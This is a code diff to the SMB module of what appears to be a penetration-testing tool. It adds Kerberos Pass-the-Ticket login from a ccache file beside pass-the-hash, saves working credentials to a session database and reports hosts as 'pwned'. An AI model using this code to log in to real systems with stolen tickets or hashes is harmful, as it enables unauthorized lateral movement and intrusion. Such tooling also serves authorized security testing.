@@ -71,7 +71,20 @@ class SMBModule:
             print_result(self._proto(), self.target.ip, "fail", "no hay conexión activa, llama a connect() primero")
             return False
         try:
-            if self.creds.hash:
+            if self.creds.ccache:
+                # Pass-the-Ticket vía ccache — impacket usa KRB5CCNAME
+                import os
+                os.environ["KRB5CCNAME"] = self.creds.ccache
+                self.conn.kerberosLogin(
+                    self.creds.user or "",
+                    "",
+                    self.creds.domain or "",
+                    lmhash="", nthash="",
+                    aesKey="",
+                    kdcHost=self.target.ip,
+                    TGT=None, TGS=None
+                )
+            elif self.creds.hash:
                 nthash = self.creds.hash.split(":")[-1]
                 self.conn.login(self.creds.user, "", self.creds.domain, lmhash="", nthash=nthash)
             else:
@@ -80,8 +93,15 @@ class SMBModule:
                 session_db.save_finding(self.target.ip, "SMB", "null_session", "null session permitida vía login()")
                 print_result(self._proto(), self.target.ip, "ok", "null session permitida")
             else:
-                secret = self.creds.hash if self.creds.hash else self.creds.password
-                secret_type = "hash" if self.creds.hash else "password"
+                if self.creds.ccache:
+                    secret = self.creds.ccache
+                    secret_type = "ccache"
+                elif self.creds.hash:
+                    secret = self.creds.hash
+                    secret_type = "hash"
+                else:
+                    secret = self.creds.password
+                    secret_type = "password"
                 session_db.save_credential(self.target.ip, self.creds.user, secret, secret_type,
                                            valid=True, source="smb_login")
                 print_result(self._proto(), self.target.ip, "pwned", f"login correcto como {self.creds.user}")
